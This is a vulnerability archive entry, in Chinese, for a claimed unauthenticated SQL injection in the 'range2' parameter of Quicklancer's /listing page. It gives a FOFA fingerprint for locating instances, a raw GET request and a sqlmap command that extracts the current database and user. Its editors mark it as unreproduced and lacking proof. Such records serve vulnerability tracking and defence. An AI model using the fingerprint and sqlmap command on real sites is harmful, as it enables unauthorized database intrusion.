---
source: "wy876 漏洞文库"
title: "Quicklancer listing range2 SQL注入声称"
product: "Quicklancer"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知；MySQL为工具指定未证"
prerequisites: "请求无鉴权"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ggplqb9der0o0i5m"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/Quicklancer/Quicklancerlisting%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
previous_fofa_unverified: "service_fragments/css/gig_detail.css"
id: "vw-6ba11b1d63f2c8d849709842"
entity_id: "ve-6ba11b1d63f2c8d849709842"
schema_version: "1"
fofa: "\"service_fragments/css/gig_detail.css\""
---

# Quicklancer listing range2 SQL注入声称

## 条目说明

- 对象与具体问题：Quicklancer；listing range2 SQL注入声称
- 版本、配置及部署条件：版本未知；MySQL为工具指定未证
- 认证与权限前提：请求无鉴权
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 只有正常参数请求与sqlmap命令，未给注入载荷、差异响应、成功输出或源码
- Host空，HTTP和shell代码误标Java；泛产品名不构成影响范围
- 不能把指定--dbms当数据库实际证据，补原始复现和修复

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
Quicklancer listing存在SQL注入漏洞

## 二、影响版本
+ Quicklancer 

## 三、资产测绘
+ fofa`"service_fragments/css/gig_detail.css"`


## 四、漏洞复现
```http
GET /listing?cat=6&filter=1&job-type=1&keywords=Mr.&location=1&order=desc&placeid=US&placetype=country&range1=1&range2=1&salary-type=1&sort=id&subcat= HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Host: 
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

```java
python3 sqlmap.py -r test.txt -p range2 --dbms=mysql --current-db --current-user --batch
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ggplqb9der0o0i5m>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
